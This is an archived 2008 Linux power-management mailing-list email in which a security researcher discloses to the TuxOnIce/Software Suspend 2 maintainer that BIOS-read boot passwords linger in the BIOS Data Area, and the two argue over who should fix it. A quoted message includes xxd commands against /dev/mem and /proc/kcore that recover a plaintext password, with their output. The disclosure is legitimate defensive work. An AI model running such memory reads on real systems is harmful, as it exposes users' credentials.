From: Jonathan Brossard <jonathan@iviztechnosolutions.com>
Subject: Re: Vulnerability in Software Suspend 2 (all versions)
Date: Mon, 28 Jul 2008 14:26:08 +0530
Message-ID: <488D89A8.2050101@iviztechnosolutions.com>
References: <488D821D.5060603@iviztechnosolutions.com>	
	<1217234068.8430.108.camel@nigel-laptop>	
	<488D86BB.1050500@iviztechnosolutions.com>
	<1217235150.8430.119.camel@nigel-laptop>
Mime-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Return-path: <linux-pm-bounces@lists.linux-foundation.org>
In-Reply-To: <1217235150.8430.119.camel@nigel-laptop>
List-Unsubscribe: <https://lists.linux-foundation.org/mailman/listinfo/linux-pm>,
	<mailto:linux-pm-request@lists.linux-foundation.org?subject=unsubscribe>
List-Archive: <http://lists.linux-foundation.org/pipermail/linux-pm>
List-Post: <mailto:linux-pm@lists.linux-foundation.org>
List-Help: <mailto:linux-pm-request@lists.linux-foundation.org?subject=help>
List-Subscribe: <https://lists.linux-foundation.org/mailman/listinfo/linux-pm>,
	<mailto:linux-pm-request@lists.linux-foundation.org?subject=subscribe>
Sender: linux-pm-bounces@lists.linux-foundation.org
Errors-To: linux-pm-bounces@lists.linux-foundation.org
To: Nigel Cunningham <ncunningham@crca.org.au>
Cc: ncunningham@users.sourceforge.net, chabaud@users.sourceforge.net, bernardb@users.sourceforge.net, seasons@users.sourceforge.net, techteam@ivizindia.com, "cer >> \"CERT(R) Coordination Center\"" <cert@cert.org>, mhfl@users.sourceforge.net, linux-pm <linux-pm@lists.linux-foundation.org>, Jonathan Brossard <jonathan@ivizindia.com>
List-Id: linux-pm@vger.kernel.org

Dear Nigel,

 >Why do you think I'm in Switzerland? I'm actually a New Zealander,

>living in Australia.

Nothing against aussies, the project was once uppon a time austed at the federal school
of Lausane, which afaik is in Switzerland...


>Okay. As mentioned in the previous reply, I don't think this is a bug
>with TuxOnIce itself. If a BIOS data area needs clearing during resume,
>I would suggest that something like the ACPI device driver should be
>doing that, because if the memory needs clearing, it should need
>clearing irrespective of whether you've hibernated or not.

Ok. I gave you the exploit. I gave you the explaination. I gave you the fix.
Now, if you don't want to face the truth that you have a problem (why dont
you just test the exploit ?) because you don't know how to use the BIOS API
safely, that's fine : don't fix it, I don't really care.

Between : Can I quote you at my Defcon presentation  ?


Regards,

Jonathan-


Nigel Cunningham wrote:
> Hi.
>
> On Mon, 2008-07-28 at 14:13 +0530, Jonathan Brossard wrote:
>   
>> Hi Nigel,
>>
>> Sorry for assuming (wrongly) that ppl in Switzerland all speak French ;)
>>     
>
> Why do you think I'm in Switzerland? I'm actually a New Zealander,
> living in Australia.
>
>   
>> In a nutshell, I discovered a new class of vulnerabilities that I will fully
>> disclose at the Defcon security conference in August. It happens to
>> affect your software, which I would like to help you fix before I go
>> public. (Note : I have used your patch for quite a time, thanks for
>> the good job ;)
>>
>> The problem lies in a lack of sanitazation of the Bios Data Area
>> after reading the password using BIOS interruptions (you don't
>> have much choice at that early stage regarding the API anyway).
>> Once the password is read, it remains in RAM for ever, and can
>> be retreived by a (somehow) privileged user :
>>
>> root@blackbox:~# xxd -l 32 -s 0x041e  /dev/mem
>> 000041e: 7019 3405 731f 731f 7711 300b 7213 6420  p.4.s.s.w.0.r.d
>> 000042e: 0d1c 0d1c 0000 0000 0000 0000 0000 0000  ................
>> root@blackbox:~# xxd -l 32 -s 0x41e /dev/oldmem
>> 000041e: 7019 3405 731f 731f 7711 300b 7213 6420  p.4.s.s.w.0.r.d
>> 000042e: 0d1c 0d1c 0000 0000 0000 0000 0000 0000  ................
>> root@blackbox:~# xxd -l 32 -s 0x041e /dev/.static/dev/mem
>> 000041e: 7019 3405 731f 731f 7711 300b 7213 6420  p.4.s.s.w.0.r.d
>> 000042e: 0d1c 0d1c 0000 0000 0000 0000 0000 0000  ................
>> root@blackbox:~# xxd -l 32 -s 0x141e  /proc/kcore
>> 000141e: 7019 3405 731f 731f 7711 300b 7213 6420  p.4.s.s.w.0.r.d
>> 000142e: 0d1c 0d1c 0000 0000 0000 0000 0000 0000  ................
>> root@blackbox:~# xxd -l 32 -s 0x141e /dev/core
>> 000141e: 7019 3405 731f 731f 7711 300b 7213 6420  p.4.s.s.w.0.r.d
>> 000142e: 0d1c 0d1c 0000 0000 0000 0000 0000 0000  ................
>> root@blackbox:~# xxd -l 32 -s 0x141e /dev/.static/dev/core
>> 000141e: 7019 3405 731f 731f 7711 300b 7213 6420  p.4.s.s.w.0.r.d
>> 000142e: 0d1c 0d1c 0000 0000 0000 0000 0000 0000  ................
>> root@blackbox:~#
>>
>>
>> The patch was made against the latest vanilla kernel and checked
>> under gentoo 2006 and Ubuntu Gutsy. It *should* work even if you
>> don't have a standard 3Go/1Go user/kernel split. It simply sanitizes
>> the RAM areas in question.
>>
>> Like I mentioned previously, I would appreciate credits. If you chose
>> to credit us for our work, you can quote :
>> Jonathan Brossard, endrazine@gmail.com, jonathan@ivizindia.com
>>
>>
>> Feel free to contact me if you have any additional questions or feedback :)
>>     
>
> Okay. As mentioned in the previous reply, I don't think this is a bug
> with TuxOnIce itself. If a BIOS data area needs clearing during resume,
> I would suggest that something like the ACPI device driver should be
> doing that, because if the memory needs clearing, it should need
> clearing irrespective of whether you've hibernated or not.
>
> Regards,
>
> Nigel
>
>
>   


-- 
    Jonathan Brossard
    Security Research Engineer
    iViZ Techno Solutions Pvt. Ltd.
    Mobile: +91-9748772994

    Kolkata:
    iViZ Technolgy Solutions(P) Ltd
    c/o Erevmax Technologies (P) Ltd
    DLF IT Park,
    Tower-1, 12th Floor
    08 Major Arterial Road
    New Town, Rajarhat
    Kolkata- 700 156

    Kharagpur:
    iViZ Techno Solutions Pvt Ltd,
    School of Information Technology,
    Indian Institute of Technology,
    2nd Floor, Takshashila,
    Kharagpur 721302 West Bengal, India.
    Phone: +91-3222-282300 ext 4324

    Web page: http://www.ivizindia.com
